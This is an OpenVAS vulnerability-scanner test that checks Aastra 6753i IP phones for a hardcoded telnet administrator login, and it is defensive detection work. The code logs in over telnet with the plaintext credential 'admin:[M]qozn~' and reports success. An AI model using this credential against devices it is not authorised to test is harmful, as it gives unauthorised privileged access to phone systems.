##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_aastra_ip_telephone_telnet_sec_bypass_vuln.nasl 13624 2019-02-13 10:02:56Z cfischer $
#
# Aastra IP Telephone Hardcoded Telnet Password Security Bypass Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803190");
  script_version("$Revision: 13624 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-02-13 11:02:56 +0100 (Wed, 13 Feb 2019) $");
  script_tag(name:"creation_date", value:"2013-04-09 15:08:24 +0530 (Tue, 09 Apr 2013)");
  script_name("Aastra IP Telephone Hardcoded Telnet Password Security Bypass Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Default Accounts");
  script_require_ports("Services/www", 80, "Services/telnet", 23);
  script_dependencies("gb_get_http_banner.nasl", "telnetserver_detect_type_nd_version.nasl");
  script_mandatory_keys("Aastra_6753i/banner", "telnet/vxworks/detected");

  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2013/Apr/42");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/526207");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/aastra-ip-telephone-hardcoded-password");

  script_tag(name:"insight", value:"Aastra 6753i IP Phone installs with default hardcoded
  administrator credentials (username/password combination).");

  script_tag(name:"solution", value:"Upgrade to latest version of Aastra 6753i IP Telephone.");

  script_tag(name:"summary", value:"This host is running Aastra IP Telephone and is prone to
  security bypass vulnerability.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to access the device
  and gain privileged access.");

  script_tag(name:"affected", value:"Aastra 6753i IP Telephone.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("telnet_func.inc");

port = get_telnet_port(default:23);
banner = get_telnet_banner(port:port);
if(!banner || "VxWorks login:" >!< banner)
  exit(0);

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

send(socket:soc, data:string("admin","\r\n"));
res = recv(socket:soc, length:4096);

if("Password:" >< res){
  send(socket:soc, data:string("[M]qozn~","\r\n"));
  res = recv(socket:soc, length:4096);
  if("->" >< res && "Login incorrect" >!< res){
    report = "It was possible to login with the following hardcoded credentials: 'admin:[M]qozn~'";
    security_message(port:port, data:report);
    close(soc);
    exit(0);
  }
}

close(soc);
exit(99);